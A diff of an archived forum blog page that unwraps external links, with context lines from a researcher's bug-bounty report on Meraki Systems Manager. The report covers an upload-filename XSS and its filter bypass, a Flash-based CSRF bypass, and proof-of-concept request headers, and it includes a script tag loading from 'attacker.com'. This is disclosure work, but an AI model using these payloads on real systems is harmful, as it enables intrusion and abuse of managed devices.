@@ -587,7 +587,7 @@ On sending the following notification request on System manager app to client.<b
 POST /Systems-Manager/n/Vo6a5cI/manage/pcc/msg/582090251837638886 HTTP/1.1<br/>
 Host: n34.meraki.com<br/>
 Connection: keep-alive<br/>
-Origin: <a href="../external.html?link=https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br/>
+Origin: <a href="https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br/>
 X-Requested-With: XMLHttpRequest<br/>
 Cookie:<br/>
 <br/>
@@ -683,7 +683,7 @@ Now inorder to make this more critical we need to find and XSS or CSRF bug , tha
 <br/>
 <br/>
 Affected Page: <br/>
-<a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br/>
+<a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br/>
 <br/>
 The Application where it accepts IOS configuration file does not properly sanitize the filename parameter. This allows an arbitrary payload injection.<br/>
 There is a small filtering in the backend on the filename, which could be easily bypassed. The filter only checks for [ ; , : , / , \ , ” , ; ] characters. And if any of the above occurrences in the string is found, the input is truncated from that index.<br/>
@@ -706,7 +706,7 @@ Size:  7.8 KB" border="0" src="attachment1e6a.jpg?attachmentid=610&amp;d=1372752
 <br/>
 2) Upload the configuration file at <br/>
 <br/>
-<a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br/>
+<a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/configure/pcc_mobile_profiles" target="_blank">https://n34.meraki.com/Systems-Manag...obile_profiles</a><br/>
 <br/>
 <br/>
 <br/>
@@ -736,7 +736,7 @@ Here the victims &amp;authenticity_token [token] and a parameter &amp;_ [current
 <img alt="Name:  Screen Shot 2013-07-02 at 1.42.38 PM.jpg
 Views: 1344
 Size:  17.1 KB" border="0" src="attachment8d0d.jpg?attachmentid=613&amp;d=1372752890" style="float: CONFIG"/><br/>
-I was not able to find a filter bypass for http:// [:// ] . This could have been an option [http&amp; # 58 ; &amp; # 4 7 ; &amp; # 4 7 ] but since “ ;” is filtered this does not work. But in older browsers something like this should work &lt;script src="aa@attacker.com" &gt;. This XSS can be triggered using the below mentioned CSRF protection bypass bug as well by a remote attacker.  I went for help online from <a href="../external.html?link=http://amolnaik4.blogspot.com/" target="_blank">Amol naik</a> and<a href="../external.html?link=http://ironwasp.org/" target="_blank"> Lavakumar Kuppan</a> and had a very good discussion . <br/>
+I was not able to find a filter bypass for http:// [:// ] . This could have been an option [http&amp; # 58 ; &amp; # 4 7 ; &amp; # 4 7 ] but since “ ;” is filtered this does not work. But in older browsers something like this should work &lt;script src="aa@attacker.com" &gt;. This XSS can be triggered using the below mentioned CSRF protection bypass bug as well by a remote attacker.  I went for help online from <a href="http://amolnaik4.blogspot.com/" target="_blank">Amol naik</a> and<a href="http://ironwasp.org/" target="_blank"> Lavakumar Kuppan</a> and had a very good discussion . <br/>
 <br/>
 Now we have an XSS not quite useful but fun one. I also noticed this small issue that could lead to code execution using the first bug if the admin is using a vulnerable version of flash. The main reason for addressing on such bug is the fact that meraki system manager, that can send shell commands to remote users as well as the Bug 1 were we explained code execution and if there is small chance for CSRF then it would be pretty bad.<br/>
 <br/>
@@ -750,7 +750,7 @@ The issue is if either one of the above conditions satisfies in a request then t
 </u><br/>
  Under certain conditions the Ajax Http headers could be forged and custom http headers could be added there by defeating the application CSRF protection mechanism. The vulnerability affects meraki users who are running on low version of flash.  Many critical calls in the application depend on Ajax headers for CSRF protection.  So there by crafting a malicious flash page it would be possible to affect meraki users who’s browsers run a lower version of flash. A detailed write up of the bug could be read form here.Ruby on Rails, which is used by meraki has patched the header bypass issue, but the patches require meraki developers to fix their code to always send a CSRF token in Ajax requests. .<br/>
 <br/>
-<a href="../external.html?link=http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html" target="_blank">http://lists.webappsec.org/pipermail...ry/007533.html</a><br/>
+<a href="http://lists.webappsec.org/pipermail/websecurity_lists.webappsec.org/2011-February/007533.html" target="_blank">http://lists.webappsec.org/pipermail...ry/007533.html</a><br/>
 <br/>
 Using the above issue the following poc exploit was prepared. <br/>
 <br/>
@@ -766,7 +766,7 @@ Accept-Language: en-gb,en;q=0.5<br/>
 Accept-Encoding: gzip, deflate<br/>
 Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br/>
 X-Requested-With: XMLHttpRequest<br/>
-Referer: <a href="../external.html?link=https://n1.meraki.com/Live-Demo-Branch/n/sWS0Fa/manage/reports" target="_blank">https://n1.meraki.com/Live-Demo-Bran...manage/reports</a><br/>
+Referer: <a href="https://n1.meraki.com/Live-Demo-Branch/n/sWS0Fa/manage/reports" target="_blank">https://n1.meraki.com/Live-Demo-Bran...manage/reports</a><br/>
 Content-Length: 74<br/>
 Cookie: [striped] <br/>
 <br/>
@@ -782,12 +782,12 @@ Host: n34.meraki.com<br/>
 Connection: keep-alive<br/>
 Content-Length: 53<br/>
 Accept: */*<br/>
-Origin: <a href="../external.html?link=https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br/>
+Origin: <a href="https://n34.meraki.com/" target="_blank">https://n34.meraki.com</a><br/>
 X-Requested-With: XMLHttpRequest<br/>
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31<br/>
 Content-Type: application/x-www-form-urlencoded<br/>
 DNT: 1<br/>
-Referer: <a href="../external.html?link=https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/pcc/command" target="_blank">https://n34.meraki.com/Systems-Manag...ge/pcc/command</a><br/>
+Referer: <a href="https://n34.meraki.com/Systems-Manager/n/7iHAgbI/manage/pcc/command" target="_blank">https://n34.meraki.com/Systems-Manag...ge/pcc/command</a><br/>
 Accept-Encoding: gzip,deflate,sdch<br/>
 Accept-Language: en-US,en;q=0.8<br/>
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3<br/>
@@ -810,11 +810,11 @@ While understanding and finding a bypass for the above bug XSS bug I noticed few
 </u></b><br/>
 <br/>
 The meraki system manager has got an option to configure a software installer for the clients.[ The module we found XSS on ]<br/>
-<u><a href="../external.html?link=https://n34/" target="_blank">https://n34</a>.</u>meraki<u>.com/Systems-Manager/n/Vo6a5cI/manage/pcc/installer</u><br/>
+<u><a href="https://n34/" target="_blank">https://n34</a>.</u>meraki<u>.com/Systems-Manager/n/Vo6a5cI/manage/pcc/installer</u><br/>
 <br/>
 Based on the docunmentation  here. <br/>
 <br/>
-<u><a href="../external.html?link=https://docs/" target="_blank">https://docs</a>.</u>meraki<u>.com/display/SM/Configure+%3E+Software+installer</u><br/>
+<u><a href="https://docs/" target="_blank">https://docs</a>.</u>meraki<u>.com/display/SM/Configure+%3E+Software+installer</u><br/>
 <br/>
 "<br/>
 Please keep in mind that you will only be able to deploy .msi files to Windows machines and .pkg files to Mac OS machines.<br/>
@@ -831,7 +831,7 @@ But it was possible to bypass these restrictions to perform the following action
 <br/>
 Based on our analysis , an opensource ruby on rails project [carrierwave direct ] was used on "/Systems-Manager/n/Vo6a5cI/manage/pcc/installer" page.<br/>
 <br/>
-Project: <u><a href="../external.html?link=https://github.com/dwilkie/carrierwave_direct" target="_blank">https://github.com/dwilkie/carrierwave_direct</a></u><br/>
+Project: <u><a href="https://github.com/dwilkie/carrierwave_direct" target="_blank">https://github.com/dwilkie/carrierwave_direct</a></u><br/>
 <br/>
 The current version of the carrierwave direct code powering meraki is outdated .<br/>
 <br/>
@@ -923,7 +923,7 @@ account blocked or the domain blacklisted. Malware developers can use Meraki acc
 user accounts using a single [gmail]email id in my previous report. That technique can be used to create n no of accounts.<br/>
 <br/>
 3) Even though the open source code carrierwave_direct has got a file extension whitelisting and and file size limit,<br/>
-<u><a href="../external.html?link=https://github.com/dwilkie/carrierwave_direct/blob/master/spec/orm/activerecord_spec.rb" target="_blank">https://github.com/dwilkie/carrierwa...record_spec.rb</a></u><br/>
+<u><a href="https://github.com/dwilkie/carrierwave_direct/blob/master/spec/orm/activerecord_spec.rb" target="_blank">https://github.com/dwilkie/carrierwa...record_spec.rb</a></u><br/>
 <br/>
 I don't find it configured properly on meraki.<br/>
 <br/>
@@ -944,7 +944,7 @@ This section contains few observations that cannot be either classified as a sec
 </u></b><br/>
 It is possible to create multiple accounts under same email. This under certain scenarios could be dangerous.<br/>
 <br/>
-<a href="../external.html?link=https://account.meraki.com/login/new_account" target="_blank">https://account.meraki.com/login/new_account</a><br/>
+<a href="https://account.meraki.com/login/new_account" target="_blank">https://account.meraki.com/login/new_account</a><br/>
 <br/>
 The application treats <br/>
 <br/>
@@ -955,7 +955,7 @@ Any way I had a productive weekend and some easy CASH[$$$] , so this bug hunting
 <br/>
 Regards,<br/>
 <u><b>Rahul Sasi<br/>
-</b></u><a href="../external.html?link=http://in.linkedin.com/pub/rahul-sasi-fb1h2s/15/112/b91/" target="_blank">http://in.linkedin.com/pub/rahul-sas...2s/15/112/b91/</a>
+</b></u><a href="http://in.linkedin.com/pub/rahul-sasi-fb1h2s/15/112/b91/" target="_blank">http://in.linkedin.com/pub/rahul-sas...2s/15/112/b91/</a>
 
 					
 				</blockquote>
@@ -1815,7 +1815,7 @@ google_ad_height = 90;
 		
 		
 		<li><a href="archive/index.html">Archive</a></li>
-		<li><a href="../external.html?link=http://glowhost.com/" target="_blank">Web Hosting</a></li>
+		<li><a href="#" target="_blank">Web Hosting</a></li>
 		
 		
 		<li><a href="blog1286.html?b=785&amp;goto=next#top" onclick="document.location.hash='top'; return false;">Top</a></li>
@@ -1840,7 +1840,7 @@ google_ad_height = 90;
 
 <div class="shade footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
 <div class="shade footer_morecopyright" id="footer_morecopyright">
